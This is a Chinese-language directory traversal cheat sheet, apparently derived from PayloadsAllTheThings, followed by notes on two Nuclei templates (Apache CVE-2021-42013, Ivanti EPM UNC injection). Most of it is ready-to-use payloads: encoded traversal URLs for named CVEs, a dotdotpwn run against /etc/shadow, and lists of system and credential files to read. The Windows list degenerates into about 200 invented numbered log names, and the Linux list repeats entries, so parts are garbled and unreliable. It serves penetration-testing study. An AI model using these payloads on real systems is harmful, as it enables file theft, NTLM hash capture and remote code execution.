# 目录遍历 (Directory Traversal)

> 路径遍历（Path Traversal），也称为目录遍历（Directory Traversal），是一种安全漏洞，当攻击者操纵引用文件的变量时，使用"点-点-斜线（../）"序列或类似结构。这可能允许攻击者访问存储在文件系统上的任意文件和目录。

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [URL编码](#url编码)
    * [双重URL编码](#双重url编码)
    * [Unicode编码](#unicode编码)
    * [过长的UTF-8 Unicode编码](#过长的utf-8-unicode编码)
    * [混乱路径](#混乱路径)
    * [空字节](#空字节)
    * [反向代理URL实现](#反向代理url实现)
* [利用](#利用)
    * [UNC共享](#unc共享)
    * [ASP.NET无Cookie](#aspnet-无cookie)
    * [IIS短名称](#iis-短名称)
    * [Java URL协议](#java-url协议)
* [路径遍历](#路径遍历)
    * [Linux文件](#linux文件)
    * [Windows文件](#windows文件)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - 目录遍历模糊测试工具

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## 方法学

我们可以使用`..`字符访问父目录，以下是几种编码方式，可以帮助您绕过实现不佳的过滤器。

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL编码

| 字符 | 编码后 |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

**示例:** IPConfigure Orchid Core VMS 2.0.5 - 本地文件包含

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### 双重URL编码

双重URL编码是对字符串应用两次URL编码的过程。在URL编码中，特殊字符被替换为%后跟其十六进制ASCII值。双重编码对已编码的字符串重复此过程。

| 字符 | 编码后 |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

**示例:** Spring MVC 目录遍历漏洞 (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode编码

| 字符 | 编码后 |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

**示例**: Openfire 管理控制台 - 认证绕过 (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### 过长的UTF-8 Unicode编码

UTF-8标准规定，每个码点使用表示其有效位所需的最少字节数进行编码。任何使用比所需更多字节的编码都被称为"过长"，在UTF-8规范下被视为无效。此规则确保码点与其有效编码之间的一对一映射，保证每个码点都有单一、唯一的表示。

| 字符 | 编码后 |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |

### 混乱路径

有时您会遇到一个会删除`../`字符的WAF，只需重复它们即可。

```powershell
..././
...\.\
```

**示例:** Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### 空字节

空字节（`%00`），也称为空字符，是许多编程语言和系统中的特殊控制字符（0x00）。在C和C++等语言中，它通常用作字符串终止符。在目录遍历攻击中，空字节用于操纵或绕过服务器端输入验证机制。

**示例:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**示例:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### 反向代理URL实现

Nginx将`/..;/`视为目录，而Tomcat将其视为`/../`，这允许我们访问任意servlet。

```powershell
..;/
```

**示例**: Pascom云电话系统 CVE-2021-45967

NGINX和后端Tomcat服务器之间的配置错误导致Tomcat服务器中的路径遍历，暴露了意外的端点。

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

## 利用

这些利用影响与特定技术相关的机制。

### UNC共享

UNC（通用命名约定）共享是一种标准格式，用于以与平台无关的方式指定网络上资源（如共享文件、目录或设备）的位置。它通常在Windows环境中使用，但其他操作系统也支持。

攻击者可以将**Windows** UNC共享（`\\UNC\share\name`）注入到软件系统中，可能将访问重定向到非预期位置或任意文件。

```powershell
\\localhost\c$\windows\win.ini
```

此外，机器可能还会在此远程共享上进行身份验证，从而发送NTLM交换。

### ASP.NET 无Cookie

当启用无Cookie会话状态时，ASP.NET不依赖cookie来识别会话，而是通过将Session ID直接嵌入URL来修改URL。

例如，典型的URL可能会从：`http://example.com/page.aspx` 转换为：`http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`。`(S(...))`中的值是Session ID。

| .NET 版本   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |


我们可以利用此行为绕过过滤的URL。

* 如果您的应用程序在主文件夹中

    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* 如果您的应用程序在子文件夹中

    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

### IIS 短名称

IIS 8.0之前的版本包含一个漏洞，可能允许攻击者猜测服务器上文件或目录的名称。这被称为IIS短名称漏洞。

```powershell
http://example.com/*~1*/.aspx
http://example.com/a*~1*/.aspx
```

### Java URL协议

Java应用程序可能容易受到通过`jar:`、`file:`、`http:`等协议的目录遍历攻击。

```powershell
jar:http://example.com/bar/bar.jar!/META-INF/MANIFEST.MF
file:///etc/passwd
```

## 路径遍历

### Linux文件

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*
/root/.bash_history
/root/.bashrc
/root/.profile
/var/log/auth.log
/var/log/daemon.log
/var/log/messages
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mysql/error.log
/var/log/mysql/mysql.log
/var/log/postgresql/postgresql-*.log
/var/log/redis/redis-server.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mysql/error.log
/var/log/mysql/mysql.log
/var/log/postgresql/postgresql-*.log
/var/log/redis/redis-server.log
/var/log/auth.log
/var/log/daemon.log
/var/log/messages
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mysql/error.log
/var/log/mysql/mysql.log
/var/log/postgresql/postgresql-*.log
/var/log/redis/redis-server.log
```

### Windows文件

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\apache\conf\extra\httpd-ssl.conf
C:\xampp\apache\conf\extra\httpd-vhosts.conf
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\apache\logs\httpd.pid
C:\xampp\apache\logs\ssl_request.log
C:\xampp\apache\logs\ssl_engine.log
C:\xampp\apache\logs\ssl_access_log
C:\xampp\apache\logs\ssl_error_log
C:\xampp\apache\logs\ssl_request_log
C:\xampp\apache\logs\ssl_engine_log
C:\xampp\apache\logs\ssl_scache.log
C:\xampp\apache\logs\ssl_scache.log.old
C:\xampp\apache\logs\ssl_scache.log.1
C:\xampp\apache\logs\ssl_scache.log.2
C:\xampp\apache\logs\ssl_scache.log.3
C:\xampp\apache\logs\ssl_scache.log.4
C:\xampp\apache\logs\ssl_scache.log.5
C:\xampp\apache\logs\ssl_scache.log.6
C:\xampp\apache\logs\ssl_scache.log.7
C:\xampp\apache\logs\ssl_scache.log.8
C:\xampp\apache\logs\ssl_scache.log.9
C:\xampp\apache\logs\ssl_scache.log.10
C:\xampp\apache\logs\ssl_scache.log.11
C:\xampp\apache\logs\ssl_scache.log.12
C:\xampp\apache\logs\ssl_scache.log.13
C:\xampp\apache\logs\ssl_scache.log.14
C:\xampp\apache\logs\ssl_scache.log.15
C:\xampp\apache\logs\ssl_scache.log.16
C:\xampp\apache\logs\ssl_scache.log.17
C:\xampp\apache\logs\ssl_scache.log.18
C:\xampp\apache\logs\ssl_scache.log.19
C:\xampp\apache\logs\ssl_scache.log.20
C:\xampp\apache\logs\ssl_scache.log.21
C:\xampp\apache\logs\ssl_scache.log.22
C:\xampp\apache\logs\ssl_scache.log.23
C:\xampp\apache\logs\ssl_scache.log.24
C:\xampp\apache\logs\ssl_scache.log.25
C:\xampp\apache\logs\ssl_scache.log.26
C:\xampp\apache\logs\ssl_scache.log.27
C:\xampp\apache\logs\ssl_scache.log.28
C:\xampp\apache\logs\ssl_scache.log.29
C:\xampp\apache\logs\ssl_scache.log.30
C:\xampp\apache\logs\ssl_scache.log.31
C:\xampp\apache\logs\ssl_scache.log.32
C:\xampp\apache\logs\ssl_scache.log.33
C:\xampp\apache\logs\ssl_scache.log.34
C:\xampp\apache\logs\ssl_scache.log.35
C:\xampp\apache\logs\ssl_scache.log.36
C:\xampp\apache\logs\ssl_scache.log.37
C:\xampp\apache\logs\ssl_scache.log.38
C:\xampp\apache\logs\ssl_scache.log.39
C:\xampp\apache\logs\ssl_scache.log.40
C:\xampp\apache\logs\ssl_scache.log.41
C:\xampp\apache\logs\ssl_scache.log.42
C:\xampp\apache\logs\ssl_scache.log.43
C:\xampp\apache\logs\ssl_scache.log.44
C:\xampp\apache\logs\ssl_scache.log.45
C:\xampp\apache\logs\ssl_scache.log.46
C:\xampp\apache\logs\ssl_scache.log.47
C:\xampp\apache\logs\ssl_scache.log.48
C:\xampp\apache\logs\ssl_scache.log.49
C:\xampp\apache\logs\ssl_scache.log.50
C:\xampp\apache\logs\ssl_scache.log.51
C:\xampp\apache\logs\ssl_scache.log.52
C:\xampp\apache\logs\ssl_scache.log.53
C:\xampp\apache\logs\ssl_scache.log.54
C:\xampp\apache\logs\ssl_scache.log.55
C:\xampp\apache\logs\ssl_scache.log.56
C:\xampp\apache\logs\ssl_scache.log.57
C:\xampp\apache\logs\ssl_scache.log.58
C:\xampp\apache\logs\ssl_scache.log.59
C:\xampp\apache\logs\ssl_scache.log.60
C:\xampp\apache\logs\ssl_scache.log.61
C:\xampp\apache\logs\ssl_scache.log.62
C:\xampp\apache\logs\ssl_scache.log.63
C:\xampp\apache\logs\ssl_scache.log.64
C:\xampp\apache\logs\ssl_scache.log.65
C:\xampp\apache\logs\ssl_scache.log.66
C:\xampp\apache\logs\ssl_scache.log.67
C:\xampp\apache\logs\ssl_scache.log.68
C:\xampp\apache\logs\ssl_scache.log.69
C:\xampp\apache\logs\ssl_scache.log.70
C:\xampp\apache\logs\ssl_scache.log.71
C:\xampp\apache\logs\ssl_scache.log.72
C:\xampp\apache\logs\ssl_scache.log.73
C:\xampp\apache\logs\ssl_scache.log.74
C:\xampp\apache\logs\ssl_scache.log.75
C:\xampp\apache\logs\ssl_scache.log.76
C:\xampp\apache\logs\ssl_scache.log.77
C:\xampp\apache\logs\ssl_scache.log.78
C:\xampp\apache\logs\ssl_scache.log.79
C:\xampp\apache\logs\ssl_scache.log.80
C:\xampp\apache\logs\ssl_scache.log.81
C:\xampp\apache\logs\ssl_scache.log.82
C:\xampp\apache\logs\ssl_scache.log.83
C:\xampp\apache\logs\ssl_scache.log.84
C:\xampp\apache\logs\ssl_scache.log.85
C:\xampp\apache\logs\ssl_scache.log.86
C:\xampp\apache\logs\ssl_scache.log.87
C:\xampp\apache\logs\ssl_scache.log.88
C:\xampp\apache\logs\ssl_scache.log.89
C:\xampp\apache\logs\ssl_scache.log.90
C:\xampp\apache\logs\ssl_scache.log.91
C:\xampp\apache\logs\ssl_scache.log.92
C:\xampp\apache\logs\ssl_scache.log.93
C:\xampp\apache\logs\ssl_scache.log.94
C:\xampp\apache\logs\ssl_scache.log.95
C:\xampp\apache\logs\ssl_scache.log.96
C:\xampp\apache\logs\ssl_scache.log.97
C:\xampp\apache\logs\ssl_scache.log.98
C:\xampp\apache\logs\ssl_scache.log.99
C:\xampp\apache\logs\ssl_scache.log.100
C:\xampp\apache\logs\ssl_scache.log.101
C:\xampp\apache\logs\ssl_scache.log.102
C:\xampp\apache\logs\ssl_scache.log.103
C:\xampp\apache\logs\ssl_scache.log.104
C:\xampp\apache\logs\ssl_scache.log.105
C:\xampp\apache\logs\ssl_scache.log.106
C:\xampp\apache\logs\ssl_scache.log.107
C:\xampp\apache\logs\ssl_scache.log.108
C:\xampp\apache\logs\ssl_scache.log.109
C:\xampp\apache\logs\ssl_scache.log.110
C:\xampp\apache\logs\ssl_scache.log.111
C:\xampp\apache\logs\ssl_scache.log.112
C:\xampp\apache\logs\ssl_scache.log.113
C:\xampp\apache\logs\ssl_scache.log.114
C:\xampp\apache\logs\ssl_scache.log.115
C:\xampp\apache\logs\ssl_scache.log.116
C:\xampp\apache\logs\ssl_scache.log.117
C:\xampp\apache\logs\ssl_scache.log.118
C:\xampp\apache\logs\ssl_scache.log.119
C:\xampp\apache\logs\ssl_scache.log.120
C:\xampp\apache\logs\ssl_scache.log.121
C:\xampp\apache\logs\ssl_scache.log.122
C:\xampp\apache\logs\ssl_scache.log.123
C:\xampp\apache\logs\ssl_scache.log.124
C:\xampp\apache\logs\ssl_scache.log.125
C:\xampp\apache\logs\ssl_scache.log.126
C:\xampp\apache\logs\ssl_scache.log.127
C:\xampp\apache\logs\ssl_scache.log.128
C:\xampp\apache\logs\ssl_scache.log.129
C:\xampp\apache\logs\ssl_scache.log.130
C:\xampp\apache\logs\ssl_scache.log.131
C:\xampp\apache\logs\ssl_scache.log.132
C:\xampp\apache\logs\ssl_scache.log.133
C:\xampp\apache\logs\ssl_scache.log.134
C:\xampp\apache\logs\ssl_scache.log.135
C:\xampp\apache\logs\ssl_scache.log.136
C:\xampp\apache\logs\ssl_scache.log.137
C:\xampp\apache\logs\ssl_scache.log.138
C:\xampp\apache\logs\ssl_scache.log.139
C:\xampp\apache\logs\ssl_scache.log.140
C:\xampp\apache\logs\ssl_scache.log.141
C:\xampp\apache\logs\ssl_scache.log.142
C:\xampp\apache\logs\ssl_scache.log.143
C:\xampp\apache\logs\ssl_scache.log.144
C:\xampp\apache\logs\ssl_scache.log.145
C:\xampp\apache\logs\ssl_scache.log.146
C:\xampp\apache\logs\ssl_scache.log.147
C:\xampp\apache\logs\ssl_scache.log.148
C:\xampp\apache\logs\ssl_scache.log.149
C:\xampp\apache\logs\ssl_scache.log.150
C:\xampp\apache\logs\ssl_scache.log.151
C:\xampp\apache\logs\ssl_scache.log.152
C:\xampp\apache\logs\ssl_scache.log.153
C:\xampp\apache\logs\ssl_scache.log.154
C:\xampp\apache\logs\ssl_scache.log.155
C:\xampp\apache\logs\ssl_scache.log.156
C:\xampp\apache\logs\ssl_scache.log.157
C:\xampp\apache\logs\ssl_scache.log.158
C:\xampp\apache\logs\ssl_scache.log.159
C:\xampp\apache\logs\ssl_scache.log.160
C:\xampp\apache\logs\ssl_scache.log.161
C:\xampp\apache\logs\ssl_scache.log.162
C:\xampp\apache\logs\ssl_scache.log.163
C:\xampp\apache\logs\ssl_scache.log.164
C:\xampp\apache\logs\ssl_scache.log.165
C:\xampp\apache\logs\ssl_scache.log.166
C:\xampp\apache\logs\ssl_scache.log.167
C:\xampp\apache\logs\ssl_scache.log.168
C:\xampp\apache\logs\ssl_scache.log.169
C:\xampp\apache\logs\ssl_scache.log.170
C:\xampp\apache\logs\ssl_scache.log.171
C:\xampp\apache\logs\ssl_scache.log.172
C:\xampp\apache\logs\ssl_scache.log.173
C:\xampp\apache\logs\ssl_scache.log.174
C:\xampp\apache\logs\ssl_scache.log.175
C:\xampp\apache\logs\ssl_scache.log.176
C:\xampp\apache\logs\ssl_scache.log.177
C:\xampp\apache\logs\ssl_scache.log.178
C:\xampp\apache\logs\ssl_scache.log.179
C:\xampp\apache\logs\ssl_scache.log.180
C:\xampp\apache\logs\ssl_scache.log.181
C:\xampp\apache\logs\ssl_scache.log.182
C:\xampp\apache\logs\ssl_scache.log.183
C:\xampp\apache\logs\ssl_scache.log.184
C:\xampp\apache\logs\ssl_scache.log.185
C:\xampp\apache\logs\ssl_scache.log.186
C:\xampp\apache\logs\ssl_scache.log.187
C:\xampp\apache\logs\ssl_scache.log.188
C:\xampp\apache\logs\ssl_scache.log.189
C:\xampp\apache\logs\ssl_scache.log.190
C:\xampp\apache\logs\ssl_scache.log.191
C:\xampp\apache\logs\ssl_scache.log.192
C:\xampp\apache\logs\ssl_scache.log.193
C:\xampp\apache\logs\ssl_scache.log.194
C:\xampp\apache\logs\ssl_scache.log.195
C:\xampp\apache\logs\ssl_scache.log.196
C:\xampp\apache\logs\ssl_scache.log.197
C:\xampp\apache\logs\ssl_scache.log.198
C:\xampp\apache\logs\ssl_scache.log.199
C:\xampp\apache\logs\ssl_scache.log.200
```

## 实验环境

* [TryHackMe - 目录遍历](https://tryhackme.com/room/directorytraversalfiles)
* [Hack The Box - 目录遍历挑战](https://www.hackthebox.com/home/challenges/Web?name=Directory%20Traversal)
* [PortSwigger Web Security Academy - 文件路径遍历](https://portswigger.net/web-security/file-path-traversal)

## 参考资料

* [OWASP - 路径遍历](https://owasp.org/www-community/attacks/Path_Traversal)
* [PortSwigger - 文件路径遍历](https://portswigger.net/web-security/file-path-traversal)
* [HackTricks - 目录遍历（路径遍历）](https://book.hacktricks.xyz/pentesting-web/directory-traversal)
* [PayloadsAllTheThings - 目录遍历](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
* [Acunetix - 什么是目录遍历攻击？](https://www.acunetix.com/websitesecurity/directory-traversal/)

---

*最后更新: 2025年6月*

## 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多种路径遍历漏洞的利用模板，以下对部分典型 YAML 文件进行详细解读。

### 1. CVE-2021-42013.yaml (Apache 路径遍历与 RCE)
- **漏洞类型**：路径遍历 & 远程代码执行
- **漏洞原理**：
  由于 Apache HTTP Server 2.4.49/2.4.50 版本中对路径规范化的修复不完整，攻击者可以通过构造特殊的 URL（如使用 `%%32%65` 进行编码绕过）来访问预期文档根目录之外的文件。如果 `mod_cgi` 等模块被启用，此路径遍历漏洞可能升级为远程代码执行。
- **探测原理**：
  该 YAML 模板首先尝试通过编码后的路径遍历 payload (`/icons/%%32%65.../etc/passwd`) 读取 `/etc/passwd` 文件，如果成功则确认 LFI。接着，它会尝试向 `/cgi-bin/`下的 `sh` 发送 POST 请求执行命令（`echo`），如果命令成功执行并返回预期结果，则确认 RCE。
- **修复建议**：升级 Apache HTTP Server至 2.4.51 或更高版本。

### 2. CVE-2024-13159.yaml (Ivanti EPM 凭证强制)
- **漏洞类型**：路径遍历（UNC 路径注入）
- **漏洞原理**：
  Ivanti Endpoint Manager (EPM) 的 `GetHashForWildcardRecursive` 端点未能正确验证 `wildcard` 参数。攻击者可以注入一个指向其控制下的服务器的 UNC 路径（如 `\\attacker-server\share`）。当 EPM 服务器尝试访问这个不存在的远程路径时，它会自动尝试通过 NTLM 协议进行身份验证，从而将其机器账户的凭证哈希发送给攻击者的服务器。攻击者可以捕获此哈希并进行离线破解或中继攻击。
- **探测原理**：
  该模板向 `VulCore.asmx` 接口发送一个 SOAP 请求，其中 `wildcard` 参数被设置为 `\\{{interactsh-url}}\tmp\{{file}}.txt`。如果 Ivanti EPM 服务器尝试解析此 UNC 路径，它会向 `interactsh` 服务器发起一个 DNS 请求。通过捕获这个 DNS 请求，即可确认漏洞存在。
- **修复建议**：应用 Ivanti 官方发布的安全补丁，对所有接受路径作为输入的参数进行严格的白名单过滤。

---

#### 总结
目录遍历漏洞的核心是信任了用户提供的文件名或路径。无论是经典的 `../` 攻击，还是利用编码、UNC 路径等变体，其目的都是为了跨越应用设定的安全边界。防御策略应包括：
- **强输入验证**：绝不相信任何用户输入的文件路径。使用白名单来限制可访问的文件和目录。
- **路径规范化**：在进行文件系统操作前，对路径进行彻底的规范化和解析，确保最终路径位于安全的、预期的目录内。
- **最小权限原则**：Web 服务器和应用服务器应以尽可能低的权限运行，限制其对文件系统的访问能力。
